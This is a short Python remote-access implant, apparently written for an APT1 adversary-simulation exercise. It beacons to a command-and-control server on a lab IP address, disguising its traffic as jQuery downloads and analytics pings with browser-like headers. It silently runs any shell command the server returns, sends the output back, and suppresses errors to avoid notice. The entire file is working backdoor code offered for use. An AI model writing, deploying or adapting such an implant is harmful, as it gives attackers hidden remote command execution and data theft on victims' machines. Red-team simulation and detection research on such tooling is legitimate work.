#!/usr/bin/env python3
# GhostRAT-Lite Beacon (Implant)
# Operation GhostUnit - APT1 Simulation  
# MITRE T1071.001 + T1059.006

import requests
import subprocess
import time
import os

# ---- CONFIG ----
C2_SERVER = "http://192.168.56.101:5000"
BEACON_INTERVAL = 5  # seconds between check-ins
# ----------------

# Disguised headers - mimics real browser traffic
# This is exactly how APT1's WEBC2 worked
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Referer": "https://www.google.com",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive"
}

def beacon():
    while True:
        try:
            # Check in to C2 - disguised as jQuery request
            response = requests.get(
                f"{C2_SERVER}/jquery.min.js",
                headers=HEADERS,
                timeout=10
            )
            command = response.text.strip()

            if command != "WAIT":
                # Execute the command silently
                result = subprocess.getoutput(command)

                # Send result back - disguised as analytics ping
                requests.post(
                    f"{C2_SERVER}/analytics.js",
                    data=result,
                    headers=HEADERS,
                    timeout=10
                )

        except Exception:
            # Stay silent on errors - never crash
            pass

        time.sleep(BEACON_INTERVAL)

if __name__ == '__main__':
    beacon()
